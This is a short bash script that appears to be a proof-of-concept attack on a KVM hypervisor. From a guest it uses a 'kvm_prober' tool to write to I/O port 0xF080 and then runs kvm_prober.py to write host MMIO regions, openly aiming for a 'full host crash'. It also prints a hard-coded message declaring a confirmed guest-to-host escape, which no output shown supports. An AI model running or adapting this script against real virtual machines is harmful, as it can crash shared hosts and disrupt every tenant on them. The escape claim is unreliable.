#!/bin/bash

echo "[*] Starting test: reading port 0"
sleep 2

echo "[*] Running command: kvm_prober readport 0 1..."
kvm_prober readport 0 1
sleep 2

echo "[*] Reading multiple reads from port 0"
sleep 2

echo "[*] Triggering port changes"
sleep 5
kvm_prober readport 0xf080 1
kvm_prober writeport 0xf080 01 1
kvm_prober writeport 0xf080 02 1
sleep 2

echo "[*] Running command: kvm_prober readport 0xF080 1 (expected: no issues)"
sleep 2
kvm_prober readport 0xF080 1
sleep 2

echo "[*] Running command: kvm_prober writeport 0xF080 1 1 (expected: host issues)"
sleep 2
kvm_prober readport 0xF080 1
kvm_prober writeport 0xF080 01 1
sleep 2

echo "[*] Checking for kernel errors"
sleep 2
dmesg | tail -n 1
sleep 5

echo "[!] CONFIRMED: influence over host controller processes aka guest-to-host escape"
sleep 5

echo "[!] Writing to MMIO host regions — attempting full host crash"
sleep 5

echo "[*] Running command: python3 kvm_prober.py (host will reset soon)"
sleep 5
python3 kvm_prober.py
